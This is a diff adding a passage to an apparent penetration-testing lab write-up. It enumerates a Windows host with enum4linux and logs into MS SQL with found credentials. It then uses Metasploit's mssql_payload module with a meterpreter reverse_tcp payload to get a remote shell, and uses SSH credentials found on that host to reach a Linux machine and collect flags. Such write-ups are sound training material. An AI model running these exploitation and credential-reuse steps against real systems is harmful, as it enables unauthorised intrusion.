@@ -159,3 +159,58 @@ MAC Address: 00:50:56:A2:BF:51 (VMware)
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 ```
 Most likely a null session or mssql vulnerability.
+
+Enumerating with nmap for null sessions.
+
+`enum4linux -a 172.16.64.199`
+
+![image](https://user-images.githubusercontent.com/76081641/130455544-9abda385-cc7b-479e-ac11-8acb82f9a031.png)
+
+Using metasploit to automate reconnaissance of the MS SQL Server.
+Using database credentials found fooadmin:fooadmin to log in. 
+
+![image](https://user-images.githubusercontent.com/76081641/130457410-2aca903a-22f2-40e9-8bd5-dd146b444595.png)
+
+System Administrator Logins and Windows Logins for the Server
+
+![image](https://user-images.githubusercontent.com/76081641/130458271-3d4f3c36-3ec9-4196-8432-081a0fe47a45.png)
+
+Fooadmin has administratice privileges. 
+
+Using an additional module in metasploit to gain a reverse shell on the mssql server.
+
+`use exploit/windows/mssql/mssql_payload`
+
+Configuring the module with the `windows/x64/meterpreter_reverse_tcp`
+
+![image](https://user-images.githubusercontent.com/76081641/130459672-fdabab49-a6d2-4912-933c-da8805ed49b8.png)
+
+IT WORKED!!! Gained a meterpreter shell.
+
+Spawn remote shell with `shell cd c:\Users dir`
+
+![image](https://user-images.githubusercontent.com/76081641/130460441-bf64c4f3-8078-4298-9029-de966695f4e1.png)
+
+Exploring remote machine and locate flag in `C:\Users\AdminELS\Desktop`
+
+![image](https://user-images.githubusercontent.com/76081641/130461225-7a0074f0-2857-4957-b4f1-123892be32d7.png)
+
+Searching for SSH log in credentials for the Linux machine. Located id_rsa.pub within on the AdminELS Desktop.
+
+![image](https://user-images.githubusercontent.com/76081641/130466625-01fb6bcf-0d0d-4736-8073-4c40af0d89a5.png)
+
+`ssh://developer:dF3334slKw@172.16.64.182:22#############################################################################################################################################################################################`
+
+Weird. Where is the private key..
+
+`ssh dF3334slKw@172.16.64.182 `
+
+Should be `ssh developer@172.16.64.182`
+
+Password: dF3334slKw
+
+![image](https://user-images.githubusercontent.com/76081641/130468162-8bae8f29-0e72-4353-b3a2-9387d4155aca.png)
+
+LAST FLAG!!!
+
+![image](https://user-images.githubusercontent.com/76081641/130468356-b2116ec9-7479-4d55-9645-5ce2c663b6ea.png)
